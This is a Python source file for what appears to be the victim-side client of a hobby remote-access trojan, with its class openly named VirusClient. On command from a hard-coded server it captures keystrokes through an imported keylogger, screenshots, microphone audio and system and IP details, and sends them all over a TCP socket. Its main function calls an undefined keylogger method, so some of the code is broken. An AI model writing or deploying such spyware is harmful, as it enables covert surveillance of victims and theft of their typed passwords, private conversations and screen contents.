import socket
import platform

from pynput.keyboard import Key, Listener

import time
import base64
import os

import wave
import sounddevice as sd

from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import numpy 

import pyaudio

import io

from FireRasbarry.keylogger import KeyLogger

HEADER = 2048
PORT = 5050
FORMAT = 'utf-8'
SERVER = "192.168.1.26"
ADDR = (SERVER, PORT)

# for audio

PYAUDIO = pyaudio.PyAudio()
chunk = 1024  # Record in chunks of 1024 samples
sample_format = pyaudio.paInt16  # 16 bits per sample
channels = 2
fs = 44100  # Record at 44100 samples per second
seconds = 3
filename = "output.wav"

import io
import soundfile as sf


class Actions:
    @staticmethod
    def screenshot():
        img = ImageGrab.grab()
        img.getdata()
        output = io.BytesIO()
        img.save(output, format='PNG')
        data = output.getvalue()
        id = "screenshot"
        return data, id

    @staticmethod
    def microphone(record_time=5):
        # I spend too much time on this action so decided to the the easy way...
        # to save audio file to local send it and delete

        
        audio_stream = PYAUDIO.open(format=sample_format,
                channels=channels,
                rate=fs,
                frames_per_buffer=chunk,
                input=True)
        
        audio_data = b''

        # Store data in chunks for 3 seconds
        for i in range(0, int(fs / chunk * record_time)):
            data = audio_stream.read(chunk)
            audio_data += data

        # audio data now contains a wav binary 
        data_64 = base64.b64encode(audio_data)

        return data_64, 'audio'
    
    @staticmethod
    def download_wav_file(wavcontent64: bytes, duration: int):
        wf = wave.open('test.wav', 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(PYAUDIO.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframesraw(base64.b64decode(wavcontent64))
        wf.close()
    

    @staticmethod
    def computer_information():
        content = ""
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            content += "Public IP Address: " + public_ip + '\n'

        except Exception:
            content += "Couldn't get Public IP Address (most likely max query" + '`\n`'

        content += "Processor: " + (platform.processor()) + '\n'
        content += "System: " + platform.system() + " " + platform.version() + '\n'
        content += "Machine: " + platform.machine() + "\n"
        content += "Hostname: " + hostname + "\n"
        content += "Private IP Address: " + IPAddr + "\n"
        id = 'computer_info'
        return content.encode(), id
    
class VirusClient:

    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock
        
        self.keylogger = KeyLogger()
        self.keylogger.start()

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send_data(self, data, id):
        # sending the id of the file first
        send_file_name = id.encode()
        send_file_name += b' ' * (HEADER - len(send_file_name))
        self.sock.send(send_file_name)

        # sending the length of the data
        send_length = str(len(data)).encode()
        print(send_length)
        send_length += b' ' * (HEADER - len(send_length))
        self.sock.send(send_length)


        # sending the data
        self.sock.send(data)

    ''' The side of the victim only receives actions he has to do and send 
    that's why assume that we received a action
    '''

    def respond_to_commad(self):
        msg = self.sock.recv(HEADER)
        if msg == b'':
            raise RuntimeError("socket connection broken")
        action = msg.decode().replace(" ", "")
        if action == "screenshot":
            self.send_data(*Actions.screenshot())
        elif action == "info":
            self.send_data(*Actions.computer_information())
        elif "microphone" in action:
            mic_time = int(action[10:])
            self.send_data(*Actions.microphone(mic_time))
        elif "keylogger" in action:
            # Note that keylogger is sent in base64
            last_pressed = self.keylogger.report()
            self.send_data(last_pressed, 'keylogger')
        else:
            print("something went wrong")


# conn = MySocket()
# conn.connect(*ADDR)
# while True:
#     conn.respond_to_commad()

def main():
    data, id  = Actions.keylogger()
    print(data)
    # duration = 5
    # binary, id = Actions.microphone(duration)
    # Actions.download_wav_file(binary, duration)
    

if __name__ == '__main__':
    main()